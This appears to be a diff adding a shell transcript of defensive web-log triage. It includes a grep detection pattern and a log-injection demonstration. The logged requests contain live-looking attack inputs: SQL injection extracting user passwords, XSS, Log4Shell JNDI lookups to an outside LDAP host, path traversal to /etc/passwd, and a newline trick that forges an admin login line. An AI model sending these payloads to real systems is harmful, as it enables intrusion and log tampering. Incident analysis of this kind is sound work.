@@ -1,0 +1,51 @@
+$ awk '$9 ~ /^4/ {print $1}' logs/access.log | sort | uniq -c | sort -rn | head -n 5
+     10 203.0.113.66
+      6 192.0.2.53
+      6 192.0.2.52
+      6 192.0.2.51
+      2 172.17.0.1
+$ awk '$1 == "203.0.113.66" {print $9, $7}' logs/access.log
+404 /.env
+404 /.git/config
+404 /wp-login.php
+404 /phpmyadmin/
+403 /admin/
+404 /server-status
+200 /api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--
+200 /api/products?q=%3Cscript%3Ealert(1)%3C/script%3E
+404 /backup.zip
+404 /config.php.bak
+404 /actuator/env
+200 /api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D
+401 /api/login
+$ awk -F'"' '{print $6}' logs/access.log | sort | uniq -c | sort -rn
+    424 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36
+     18 python-requests/2.32.3
+     11 Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)
+      2 -
+      1 curl/8.5.0
+      1 curl/8.18.0
+      1 ${jndi:ldap://203.0.113.66:1389/Basic/Command/whoami}
+$ grep -iE "union(%20|\+| )+select|%3Cscript|\.\./|%2e|\.\.%2f|etc/passwd|\.env|\.git/" logs/access.log | awk '{print $1, $9, $7}'
+203.0.113.66 404 /.env
+203.0.113.66 404 /.git/config
+203.0.113.66 200 /api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--
+203.0.113.66 200 /api/products?q=%3Cscript%3Ealert(1)%3C/script%3E
+172.17.0.1 400 /static/..%2f..%2f..%2fetc%2fpasswd
+172.17.0.1 400 /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+$ awk '$7 == "/api/login" {print $1, $9}' logs/access.log | sort | uniq -c
+      4 192.0.2.51 401
+      2 192.0.2.51 429
+      4 192.0.2.52 401
+      2 192.0.2.52 429
+      4 192.0.2.53 401
+      2 192.0.2.53 429
+      1 198.51.100.17 413
+      1 203.0.113.66 401
+$ grep -E 'jndi|%24%7Bjndi' logs/access.log | awk -F'"' '{print $2 " | UA: " $6}'
+GET /api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D HTTP/1.1 | UA: ${jndi:ldap://203.0.113.66:1389/Basic/Command/whoami}
+$ U=$(printf 'bob\n2026-11-24T03:00:00Z INFO login ok user=admin'); printf '2026-11-24T02:59:59Z WARN login failed user=%s\n' "$U"
+2026-11-24T02:59:59Z WARN login failed user=bob
+2026-11-24T03:00:00Z INFO login ok user=admin
+$ grep 'bob' logs/app.log | jq -c '{level, msg, user}'
+{"level":40,"msg":"login failed: bad credentials","user":"bob\n{\"level\":30,\"msg\":\"login ok\",\"user\":\"admin\"}"}
